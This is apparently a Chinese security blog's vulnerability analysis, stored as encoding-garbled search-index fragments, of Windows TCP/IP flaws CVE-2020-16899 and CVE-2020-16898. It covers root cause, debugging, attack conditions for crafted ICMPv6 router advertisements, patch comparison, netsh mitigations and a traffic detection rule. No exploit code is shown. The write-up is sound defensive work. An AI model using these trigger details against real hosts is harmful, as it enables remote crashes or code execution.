Ipv6pHandleRouterAdvertisement() åœ¨Ipv6pHandleRouterAdvertisement()å‡½æ•°ä¸­å…ˆå¯¹ä¼ å…¥çš„RAæ¶ˆæ¯åšé¢„å¤„ç†ï¼Œç„¶åæ ¹æ®ä¸åŒç±»å‹çš„optionè¿›å…¥ä¸åŒçš„å¤„ç†æµç¨‹ï¼š 2. Ipv6pUpdateDNSSL() é¦–å…ˆè¯»å–Optionç»“æ„çš„æ•°æ®ä»¥åŠDomain nameçš„é•¿åº¦ï¼š æ¥ä¸‹æ¥ï¼Œç¡®è®¤è¯»å–çš„æ•°æ®åï¼Œå¤„ç†åç¼€éƒ¨åˆ†ï¼š è¿™é‡Œåœ¨è®¡ç®—Suffixesçš„é•¿åº¦æ—¶ï¼ŒBytesToReadä¼šè¢«é™åˆ¶åœ¨0x100å­—èŠ‚é•¿åº¦èŒƒå›´å†…ï¼Œä¹Ÿå°±æ˜¯Suffixesçš„æœ€å¤§é•¿åº¦ä¸º256ã€‚ç„¶åè°ƒç”¨GetNextSuffixFromOption()å‡½æ•°è¯»å–Suffixã€‚ 3. GetNextSuffixFromOption() åœ¨è¯¥å‡½æ•°ä¸­ï¼Œåœ¨è§£æå®Œä¸€ä¸ªDNSè®°å½•åï¼Œä»£ç é€»è¾‘ä¼šæ¥åˆ°ä»¥ä¸‹ä½ç½®ï¼š è¿™é‡Œçš„ä¸»è¦ä½œç”¨æ˜¯è·³è¿‡Domain Nameä¸­çš„ç©ºå­—ç¬¦éƒ¨åˆ†ï¼Œé‡åˆ°0å°±è·³è¿‡ï¼Œè¯»å–ä¸‹ä¸€ä¸ªæ•°æ®ï¼Œç›´åˆ°é‡åˆ°é0å€¼ã€‚ä½†æ˜¯åœ¨è¿›è¡Œè¾¹ç•Œæ£€æŸ¥æ—¶ï¼Œä½¿ç”¨çš„æ¡ä»¶å‚æ•°BytesToRead_1æ˜¯å¯ä»¥è¿›è¡Œæ§åˆ¶çš„ï¼Œä»è€Œå¯ä»¥å®ç°ç»•è¿‡ï¼Œè¿›è¡Œè¶Šç•Œè¯»ã€‚ 3. åŠ¨æ€åˆ†æ Ipv6pUpdateDNSSL()å‡½æ•°ä¸‹æ–­ï¼Œç„¶åå‘é€pocåæ–­ä¸‹ï¼Œæ£€æŸ¥CallStackï¼Œç¡®è®¤æ–­ç‚¹è§¦å‘æµç¨‹ä¸é™æ€åˆ†æä¸­çš„å‡½æ•°è°ƒç”¨é“¾ä¸€è‡´ï¼š æ­¤æ—¶çš„å„å¯„å­˜å™¨æƒ…å†µå¦‚ä¸‹ï¼š è¿™é‡Œé‡ç‚¹çœ‹ä¸‹rdxå¯„å­˜å™¨ä¸­çš„å†…å®¹ï¼ˆæ¼æ´å‡½æ•°çš„ç¬¬2ä¸ªå‚æ•°ï¼‰ï¼š rdxä¸­å­˜æ”¾çš„æ˜¯ä¸€ä¸ª_NET_BUFFERç»“æ„ï¼Œå…¶è¯¦ç»†ç»“æ„å¦‚ä¸‹ï¼š typedef struct _NET_BUFFER { union { struct { PNET_BUFFER Next; PMDL CurrentMdl; ULONG CurrentMdlOffset; union { ULONG DataLength; SIZE_T stDataLength; }; PMDL MdlChain; ULONG DataOffset; }; SLIST_HEADER Link; NET_BUFFER_HEADER NetBufferHeader; }; USHORT ChecksumBias; USHORT Reserved; NDIS_HANDLE NdisPoolHandle; PVOID NdisReserved[2]; PVOID ProtocolReserved[6]; PVOID MiniportReserved[4]; NDIS_PHYSICAL_ADDRESS DataPhysicalAddress; union { PNET_BUFFER_SHARED_MEMORY SharedMemoryInfo; PSCATTER_GATHER_LIST ScatterGatherList; }; } NET_BUFFER, *PNET_BUFFER; è€Œä¸”åœ¨å…¶ä¸­æ‰¾åˆ°äº†è§¦å‘æ¼æ´çš„ICMPv6çš„ç›¸å…³æ•°æ®ã€‚ç»§ç»­å‘ä¸‹ï¼Œæ¥åˆ°NdisGetDataBuffer()å‡½æ•°çš„ç¬¬1å¤„è°ƒç”¨ï¼š NdisGetDataBuffer()å‡½æ•°çš„ç¬¬1ä¸ªå‚æ•°ä¸ºä¼ å…¥çš„_NET_BUFFERç»“æ„ã€‚NdisGetDataBuffer()å‡½æ•°å£°æ˜å¦‚ä¸‹ï¼š PVOID NdisGetDataBuffer( PNET_BUFFER NetBuffer, // [in], a pointer to a NetBuffer structure ULONG BytesNeeded, // [in], the number of contiguous bytes of data requested PVOID Storage, // [in, optional], a pointer to a buffer, or NULL if no buffer is provided by the caller UINT AlignMultiple, // [in], the alignment multiple expressed in power of two. For example, 2, 4, 8, 16, and so forth. If AlignMultiple is 1, then there is no alignment requirement. UINT AlignOffset // [in], the offset, in bytes, from the alignment multiple. ); // Return Value A pointer to the start of the contiguous data or NULL. å¦‚æœNetBufferå‚æ•°æŒ‡å‘çš„NET_BUFFERç»“æ„ä¸­çš„NET_BUFFER_DATAéƒ¨åˆ†çš„DataLengthå­—æ®µçš„å€¼å°äºBytesNeededå‚æ•°çš„å€¼ï¼Œé‚£ä¹ˆå‡½æ•°è¿”å›NULLã€‚å‡½æ•°æ‰§è¡Œå®Œæˆåï¼Œè¿”å›ç»“æœå¦‚ä¸‹ï¼š è¿”å›çš„æ°å¥½ä¸ºDNSSL Optionçš„åœ°å€ã€‚ ç„¶åè°ƒç”¨NetioAdvanceNetBuffer()å‡½æ•°ã€‚æ‰§è¡ŒNetioAdvanceNetBuffer()å‡½æ•°ä¹‹å‰ï¼Œ_NET_BUFFERçš„ç»“æ„å¦‚ä¸‹æ‰€ç¤ºï¼š åœ¨æ‰§è¡Œå®ŒNetioAdvanceNetBuffer()å‡½æ•°åï¼Œç»“æ„å˜ä¸ºï¼š æ­¤å¤„è¯¥å‡½æ•°ä¸»è¦ä½œç”¨æ˜¯å‰è¿›8ä¸ªå­—èŠ‚è¿›è¡Œæ•°æ®è¯»å–ï¼Œå…¶æ•´ä½“æµç¨‹åŠéƒ¨åˆ†å…³é”®å‚æ•°å€¼å¦‚ä¸‹ï¼š ç»§ç»­å‘ä¸‹ï¼Œé€šè¿‡Lengthå­—æ®µè®¡ç®—BytesToReadçš„é•¿åº¦ï¼Œå¹¶å¯¹Lifetimeçš„å€¼è¿›è¡Œæ˜¯å¦ä¸º0xffffffffçš„æ£€æŸ¥ï¼š åç»­ä¼šè¿›è¡Œä¸€äº›ä¸Šä¸‹æ–‡åˆå§‹åŒ–ã€äº‹ä»¶è®°å½•ç­‰æ“ä½œï¼Œç„¶åè¿›å…¥å¾ªç¯ï¼Œå¼€å§‹å¤„ç†Opt","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:3:3","tags":["æ¼æ´"],"title":"CVE-2020-16899 Windows TCP/IPæ‹’ç»æœåŠ¡æ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"4. åˆ©ç”¨æ€è·¯ 1. åˆ©ç”¨æ¡ä»¶ åŸºæœ¬æ¡ä»¶ attackeréœ€è¦è·å–targetçš„IPv6å’ŒMACåœ°å€ è§¦å‘è¿‡ç¨‹ attackerå¯ä»¥ç›´æ¥å‘èµ·è¿œç¨‹æ”»å‡» 2. åˆ©ç”¨è¿‡ç¨‹ attackerç›´æ¥å‘é€ç‰¹åˆ¶çš„ICMPv6è·¯ç”±å¹¿æ’­æ•°æ®åŒ…ç»™targetï¼š [ Attacker ] \u003c--------------------\u003e [ Target ] 3. æ”»å‡»å‘é‡ å»ºç«‹è¿æ¥åï¼Œåˆ©ç”¨IPv6ç›´æ¥å‘é€æ”»å‡»æ•°æ®åŒ…å³å¯ã€‚ ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:3:4","tags":["æ¼æ´"],"title":"CVE-2020-16899 Windows TCP/IPæ‹’ç»æœåŠ¡æ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"5. æµé‡åˆ†æ å› ä¸ºè¯¥æ¼æ´ç›´æ¥èµ°çš„IPv6ï¼Œæ‰€ä»¥å¯¹äºä¸€äº›éƒ¨ç½²åœ¨IPå±‚ä»¥ä¸Šçš„é˜²ç«å¢™æ–¹æ¡ˆå°±æ— æ³•é’ˆå¯¹è¯¥æ¼æ´è¿›è¡Œæµé‡æ£€æµ‹ï¼Œä½†æ˜¯å…·å¤‡IPå±‚æµé‡æ£€æµ‹çš„é˜²ç«å¢™å¯ä»¥è½»æ¾æ£€æµ‹æ¶æ„æµé‡ï¼š ä½¿ç”¨å¤§é‡çš„0è¿›è¡Œå¡«å……ä»¥è§¦å‘æ¼æ´ã€‚ ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:3:5","tags":["æ¼æ´"],"title":"CVE-2020-16899 Windows TCP/IPæ‹’ç»æœåŠ¡æ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"6. è¡¥ä¸åˆ†æ 1. è¡¥ä¸å¯¹æ¯”ç»“æœ é’ˆå¯¹Ipv6pUpdateDNSSL()å‡½æ•°çš„è¡¥ä¸å¯¹æ¯”ç»“æœå¦‚ä¸‹ï¼š 2. è¡¥ä¸æ€è·¯ æ ¹æ®è¡¥ä¸å¯¹æ¯”ç»“æœï¼Œå¾®è½¯æ–°å¢äº†å¯¹BytesToReadå€¼çš„æ ¡éªŒï¼Œåœ¨è¯»å–å®ŒSuffixesä¹‹åï¼Œä¸ºç¡®ä¿ä¸å‘ç”Ÿè¶Šç•Œè¯»ï¼Œæ–°å¢äº†ä¸€æ¬¡å¯¹BytesToReadçš„æ ¡éªŒï¼Œç¡®ä¿å°äº0x100ã€‚è€Œåœ¨æ¼æ´åˆ†æä¸­ï¼Œè§¦å‘æ¼æ´æ—¶è¯¥å€¼æ˜¯å¤§äº0x100çš„ã€‚ 3. è¡¥ä¸éªŒè¯ ä½¿ç”¨å®‰è£…æ›´æ–°è¡¥ä¸åçš„Ipv6UpdateDNSSL()å‡½æ•°è¿›è¡ŒéªŒè¯ï¼Œæ–°å¢ä¿è¯BytesToReadçš„å€¼æœ€å¤§ä¸º0x100çš„ä»£ç ï¼š ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:3:6","tags":["æ¼æ´"],"title":"CVE-2020-16899 Windows TCP/IPæ‹’ç»æœåŠ¡æ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"å››ã€ç¼“è§£æªæ–½ ç®¡ç†å‘˜å¯åŠ¨powershellæˆ–cmdï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤æ£€æŸ¥æ‰€æœ‰ç½‘ç»œIPv6æ¥å£çš„åˆ—è¡¨ä»¥åŠç›¸åº”çš„ç´¢å¼•å·ï¼š netsh int ipv6 sh int æ ·ä¾‹è¾“å‡ºå¦‚ä¸‹ï¼š ç¡®è®¤ç½‘ç»œæ¥å£çš„RDNSSåŠŸèƒ½å¼€å¯æƒ…å†µï¼š netsh int ipv6 sh int Idx number æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å…³é—­RDNSSåŠŸèƒ½(å°†Idx numberæ›¿æ¢ä¸ºè¦å…³é—­çš„ç½‘ç»œæ¥å£çš„Idxå€¼)ï¼š netsh int ipv6 set int Idx number rabaseddnsconfig=disable æ ·ä¾‹è¾“å‡ºå¦‚ä¸‹ï¼š æ­¤æ—¶å†æ¬¡ç¡®è®¤æ¥å£çš„RDNSSå¼€å¯æƒ…å†µï¼ŒRDNSSåŠŸèƒ½å·²è¢«å…³é—­ï¼š ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:4:0","tags":["æ¼æ´"],"title":"CVE-2020-16899 Windows TCP/IPæ‹’ç»æœåŠ¡æ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"äº”ã€æ¼æ´æ£€æµ‹å’Œé˜²å¾¡ ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:5:0","tags":["æ¼æ´"],"title":"CVE-2020-16899 Windows TCP/IPæ‹’ç»æœåŠ¡æ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"1. æ¼æ´æ£€æµ‹ é’ˆå¯¹è¯¥æ¼æ´ï¼Œç›®å‰æš‚æœªå‘ç°æ¼æ´åŸç†ä¾§çš„æ— æŸæ£€æµ‹ã€‚ ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:5:1","tags":["æ¼æ´"],"title":"CVE-2020-16899 Windows TCP/IPæ‹’ç»æœåŠ¡æ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"2. æ¼æ´é˜²å¾¡ 1. é˜²å¾¡æ€è·¯ æµé‡é˜²å¾¡ï¼šéœ€è¦ç›‘æ§IPv6çš„æµé‡ä¼ è¾“ï¼Œå¯¹äºTypeä¸º134çš„è·¯ç”±å¹¿æ’­æ•°æ®åŒ…è¿›è¡Œæ£€æµ‹ï¼Œç¡®è®¤å…¶Typeä¸º0x1fçš„DNSSLçš„Paddingéƒ¨åˆ†æ˜¯å¦æœ‰å¤§äºç­‰äº256ä¸ª0å­—ç¬¦ã€‚ ç»ˆç«¯é˜²å¾¡ï¼šæ ¹æ®è¡¥ä¸å¯¹æ¯”ç»“æœï¼Œå¯ä»¥æŒ‰ç…§å¾®è½¯çš„è¡¥ä¸æ€è·¯ä½¿ç”¨çƒ­è¡¥ä¸è¿›è¡Œé˜²å¾¡ï¼Œå¯¹BytesToReadçš„å€¼å†åŠ ä¸€æ¬¡æ ¡éªŒã€‚ 2. å¯èƒ½å­˜åœ¨çš„é£é™© æš‚æ—¶æœªçŸ¥ã€‚ ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:5:2","tags":["æ¼æ´"],"title":"CVE-2020-16899 Windows TCP/IPæ‹’ç»æœåŠ¡æ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"å…­ã€å‚è€ƒæ–‡çŒ® https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16899 https://tools.ietf.org/html/rfc8106 ","date":"2020-10-23","objectID":"/2020/10/cve-2020-16899/:6:0","tags":["æ¼æ´"],"title":"CVE-2020-16899 Windows TCP/IPæ‹’ç»æœåŠ¡æ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16899/"},{"categories":["Vuln"],"content":"CVE-2020-16898 Bad  Neighbor Windows TCP/IPè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/","tags":["æ¼æ´"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IPè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"CVE-2020-16898 â€œBad Neighbor \" Windows TCP/IPè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:0:0","tags":["æ¼æ´"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IPè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"ä¸€ã€æ¼æ´ä¿¡æ¯ ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:1:0","tags":["æ¼æ´"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IPè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"1. æ¼æ´ç®€è¿° æ¼æ´åç§°ï¼šWindows TCP/IP Remote Code Execution Vulnerability æ¼æ´ç¼–å·ï¼šCVE-2020-16898 æ¼æ´ç±»å‹ï¼šDesign Weakness æ¼æ´å½±å“ï¼šCode Execution CVSSè¯„åˆ†ï¼š9.8 åˆ©ç”¨éš¾åº¦ï¼šMedium åŸºç¡€æƒé™ï¼šä¸éœ€è¦ ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:1:1","tags":["æ¼æ´"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IPè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"2. ç»„ä»¶æ¦‚è¿° TCP/IPæ˜¯Internetä¸Šä½¿ç”¨çš„é€šä¿¡åè®®ã€‚ åœ¨Windowsçš„æ—©æœŸç‰ˆæœ¬ä¸­ï¼ŒTCP/IPæ˜¯ä¸€ä¸ªå•ç‹¬çš„å¯é€‰ç»„ä»¶ï¼Œå¯ä»¥åƒå…¶ä»–ä»»ä½•åè®®ä¸€æ ·åˆ é™¤æˆ–æ·»åŠ ã€‚ä»Windows XP/Server 2003å¼€å§‹ï¼ŒTCP/IPæˆä¸ºæ“ä½œç³»ç»Ÿçš„æ ¸å¿ƒç»„ä»¶ï¼Œæ— æ³•åˆ é™¤ã€‚ å°†TCP/IPä½œä¸ºWindowsçš„æ ¸å¿ƒç»„ä»¶æ˜¯éå¸¸æœ‰æ„ä¹‰çš„ï¼Œå› ä¸ºå®ƒçš„åŠŸèƒ½åœ¨Microsoft Windows Serverä¸Šå¯¹ç½‘ç»œæ“ä½œå’ŒActive DirectoryåŸŸç¯å¢ƒå°¤ä¸ºé‡è¦ã€‚ æ•´ä¸ªActive Directoryæ¶æ„åŸºäºDNSå±‚æ¬¡ç»“æ„ï¼Œä¾èµ–äºTCP/IP ä¼ è¾“åè®® ã€‚ Microsoft Windowsä¸­çš„TCP/IPåŠŸèƒ½åœ¨å†…æ ¸çº§åˆ«è¿è¡Œï¼Œå¹¶ç”±é©±åŠ¨ç¨‹åºtcpip.sysæä¾›ã€‚è¯¥é©±åŠ¨ç¨‹åºå¤„ç†æ‰€æœ‰ä¼ å…¥å’Œä¼ å‡ºçš„TCP/IPé€šä¿¡ä¿¡æ¯ï¼ŒåŒ…æ‹¬è§£æä»ç½‘ç»œæ¥å£æ¥æ”¶åˆ°çš„æ•°æ®åŒ…ï¼Œä»¥åŠè§£é‡Šæ­¤æ•°æ®å¹¶å°†å…¶ä¼ é€’ç»™æ›´é«˜çº§åˆ«çš„ç»„ä»¶ã€‚ ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:1:2","tags":["æ¼æ´"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IPè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"3. æ¼æ´åˆ©ç”¨ è¯¥æ¼æ´ä¸»è¦æ˜¯ç”±äºWindows TCP/IPå †æ ˆåœ¨å¤„ç†é€‰é¡¹ç±»å‹ä¸º25(0x19ï¼Œé€’å½’DNSæœåŠ¡å™¨é€‰é¡¹)ä¸”é•¿åº¦å­—æ®µå€¼ä¸ºå¶æ•°çš„ICMPv6çš„è·¯ç”±å¹¿æ’­æ•°æ®åŒ…æ—¶ï¼Œå¤„ç†é€»è¾‘å­˜åœ¨çº°æ¼ï¼Œå¯¼è‡´å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´çš„æ”»å‡»è€…å¯ä»¥åœ¨ç›®æ ‡æœºå™¨ï¼ˆä¸»æœºæˆ–æœåŠ¡å™¨ï¼‰ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚ ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:1:3","tags":["æ¼æ´"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IPè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"4. æ¼æ´å½±å“ â€¢ Microsoft Windows 10 1709 â€¢ Microsoft Windows 10 1803 â€¢ Microsoft Windows 10 1809 â€¢ Microsoft Windows 10 1903 â€¢ Microsoft Windows 10 1909 â€¢ Microsoft Windows 10 2004 â€¢ Microsoft Windows Server 2019 â€¢ Microsoft Windows Server, version 1903 â€¢ Microsoft Windows Server, version 1909 â€¢ Microsoft Windows Server, version 2004 ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:1:4","tags":["æ¼æ´"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IPè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"5. è§£å†³æ–¹æ¡ˆ å¾®è½¯å®˜æ–¹é’ˆå¯¹è¯¥æ¼æ´å·²å‘å¸ƒå®‰å…¨æ›´æ–°è¡¥ä¸ï¼Œè¡¥ä¸åœ°å€ï¼š https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898 ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:1:5","tags":["æ¼æ´"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IPè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"äºŒã€æ¼æ´å¤ç° ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:2:0","tags":["æ¼æ´"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IPè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"1. ç¯å¢ƒæ­å»º é¶æœºï¼šWindows 10 1809 x64 é¶æœºæ“ä½œï¼šæ— éœ€ä»»ä½•æ“ä½œï¼Œå¯æ­£å¸¸ä¸æ”»å‡»æœºé€šä¿¡å³å¯ ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:2:1","tags":["æ¼æ´"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IPè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"2. å¤ç°è¿‡ç¨‹ é€šè¿‡å„ç§æ‰‹æ®µè·å–ç›®æ ‡ä¸»æœºçš„IPv6åœ°å€å’ŒMACåœ°å€ï¼ˆå…·ä½“æ–¹æ³•å¯è‡ªè¡Œæ¢ç´¢ï¼Œè¾ƒä¸ºç®€å•ï¼‰ æ”»å‡»æœºpython3è¿è¡Œpocï¼š é¶æœºcrashï¼š ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:2:2","tags":["æ¼æ´"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IPè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"ä¸‰ã€æ¼æ´åˆ†æ ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:3:0","tags":["æ¼æ´"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IPè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"1. åŸºæœ¬ä¿¡æ¯ æ¼æ´æ–‡ä»¶ï¼štcpip.sys æ¼æ´å‡½æ•°ï¼š Ipv6pUpdateRDNSS()å‡½æ•° æ¼æ´å¯¹è±¡ï¼šICMPv6è·¯ç”±å¹¿æ’­ä¸­çš„optionç»“æ„ ","date":"2020-10-21","objectID":"/2020/10/cve-2020-16898/:3:1","tags":["æ¼æ´"],"title":"CVE-2020-16898 Bad  Neighbor Windows TCP/IPè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ","uri":"/2020/10/cve-2020-16898/"},{"categories":["Vuln"],"content":"2. èƒŒæ™¯çŸ¥è¯† (é™äºç¯‡å¹…é—®é¢˜ï¼Œæ­¤å¤„ä¸å¯¹ç”¨äºDNSé…ç½®çš„IPv6è·¯ç”±å¹¿æ’­è¿›è¡Œè¯¦ç»†ä»‹ç»ï¼Œæ›´è¯¦ç»†èµ„æ–™å¯å‚è€ƒRFC8106) 1. åŸºæœ¬çŸ¥è¯† IPv6 Router Advertisment (RA) optionsï¼Œä¹Ÿç§°ä¸ºDNS RA optionsï¼Œå…è®¸IPv6çš„è·¯ç”±å™¨å‘IPv6çš„ä¸»æœºå¹¿æ’­DNS Recursive Server Address(DNSé€’å½’è·¯ç”±å™¨åœ°å€)åˆ—è¡¨å’ŒDNS Search Listï¼ˆDNSæœç´¢åˆ—è¡¨ï¼‰ï¼Œå…¶ä¸»è¦ç”¨é€”ä¸ºåœ¨IPv6çš„ä¸»æœºä¸Šè¿›è¡ŒDNSåç§°è§£æä»¥åŠåŸŸåç¼€çš„å¤„ç†ã€‚ IPv6 Neighbor Discovery(NDï¼ŒIPv6é‚»å±…å‘ç°)å’ŒIPv6 Stateless Address Autoconfiguratioin(SLAACï¼ŒIPv6æ— çŠ¶æ€åœ°å€è‡ªåŠ¨é…ç½®)æä¾›äº†ä½¿ç”¨ä¸€ä¸ªæˆ–å¤šä¸ªIPv6åœ°å€ï¼Œé»˜è®¤è·¯ç”±å™¨ä»¥åŠä¸€äº›å…¶ä»–å‚æ•°é…ç½®å›ºå®šèŠ‚ç‚¹æˆ–ç§»åŠ¨èŠ‚ç‚¹çš„æ–¹æ³•ã€‚ å½“æ¼«æ¸¸ä¸»æœºæ¯æ¬¡è¿æ¥åˆ°å¦ä¸€ä¸ªç½‘ç»œæ—¶ï¼Œæ— æ³•è¿›è¡Œæ‰‹åŠ¨é…ç½®ã€‚ è™½ç„¶å¯ä»¥è¿›è¡Œé™æ€é…ç½®ï¼Œä½†æ˜¯åœ¨è¯¸å¦‚ç¬”è®°æœ¬ç”µè„‘ä¹‹ç±»çš„é€šç”¨ä¸»æœºä¸Šé€šå¸¸ä¸å»ºè®®è¿™æ ·æ“ä½œã€‚ ä¾‹å¦‚ï¼Œå¦‚æœä¸»æœºè¿è¡Œç›´æ¥è¿æ¥åˆ°å…¨å±€DNSçš„è‡ªå·±çš„é€’å½’åç§°æœåŠ¡å™¨ï¼Œé‚£ä¹ˆæœ¬åœ°å®šä¹‰çš„åç§°ç©ºé—´å¯¹ä¸»æœºæ¥è¯´å°±ä¸å¯ç”¨äº†ã€‚ è®¿é—®DNSæ˜¯å‡ ä¹æ‰€æœ‰ä¸»æœºçš„åŸºæœ¬è¦æ±‚ï¼Œå› æ­¤IPv6 SLAACåœ¨æ²¡æœ‰ä»»ä½•DNSé…ç½®æ”¯æŒçš„æƒ…å†µä¸‹ï¼Œä¸èƒ½åœ¨ä»»ä½•å®é™…çš„ç½‘ç»œç¯å¢ƒä¸­å•ç‹¬ä½œä¸ºæ›¿ä»£éƒ¨ç½²æ¨¡å‹ã€‚ å¯¹äºIPv4ç¯å¢ƒä¸­çš„DNSæœåŠ¡å™¨æ¥è¯´ï¼Œè¿™äº›é—®é¢˜éƒ½å¾ˆå®¹æ˜“è§£å†³ã€‚ä½†æ˜¯å¯¹äºIPv6çš„ç½‘ç»œç¯å¢ƒï¼Œè¿™äº›é—®é¢˜æ˜¾å¾—æ¯”è¾ƒæ£˜æ‰‹ã€‚å› æ­¤ï¼ŒRFC8106å®šä¹‰äº†ä¸€ç§åŸºäºDNS RAé€‰é¡¹çš„æœºåˆ¶ï¼Œä»¥å…è®¸IPv6ä¸»æœºæ‰§è¡Œè‡ªåŠ¨DNSé…ç½®ã€‚ åœ¨é€šè¿‡IPv6 SLAACè‡ªåŠ¨é…ç½®IPv6ä¸»æœºåœ°å€å¹¶ä¸”æ²¡æœ‰DHCPv6åŸºç¡€ç»“æ„æˆ–ä¸€äº›ä¸»æœºæ²¡æœ‰DHCPv6å®¢æˆ·ç«¯çš„ç½‘ç»œç¯å¢ƒä¸­ï¼Œå¯ä»¥ä½¿ç”¨åŸºäºRAçš„DNSé…ç½®ä½œä¸ºæ›¿ä»£ã€‚ ä½†æ˜¯ï¼Œå¯¹äºéœ€è¦åˆ†å‘å…¶ä»–ä¿¡æ¯çš„ç½‘ç»œï¼Œå¯èƒ½ä»ç„¶ä¼šä½¿ç”¨DHCPv6ã€‚ åœ¨è¿™äº›ç½‘ç»œä¸­ï¼Œå¯èƒ½ä¸éœ€è¦åŸºäºRAçš„DNSé…ç½®ã€‚ åŸºäºRAçš„DNSé…ç½®å…è®¸IPv6ä¸»æœºè·å–ä¸»æœºè¿æ¥åˆ°çš„é“¾æ¥çš„DNSé…ç½®ï¼ˆå³DNSé€’å½’æœåŠ¡å™¨åœ°å€å’ŒDNSSLï¼‰ã€‚ æ­¤å¤–ï¼Œä¸»æœºä¼šä»æä¾›é“¾æ¥é…ç½®ä¿¡æ¯çš„åŒä¸€RAæ¶ˆæ¯ä¸­å­¦ä¹ æ­¤DNSé…ç½®ã€‚ 2. åè¯è§£é‡Š Recursive DNS Server (RDNSS)ï¼šé€’å½’DNSæœåŠ¡å™¨ï¼Œæä¾›é€’å½’DNSè§£ææœåŠ¡çš„æœåŠ¡å™¨ï¼Œç”¨äºå°†åŸŸåè½¬æ¢ä¸ºIPåœ°å€æˆ–è§£ææˆRFC1034å’ŒRFC1035ä¸­å®šä¹‰çš„PTRè®°å½•ã€‚ RDNSS Optionï¼šä¸€ä¸ªç”¨äºå‘IPv6ä¸»æœºä¼ é€RDNSSä¿¡æ¯çš„IPv6çš„RA optionã€RFC4861ã€‘ã€‚ DNS Search List 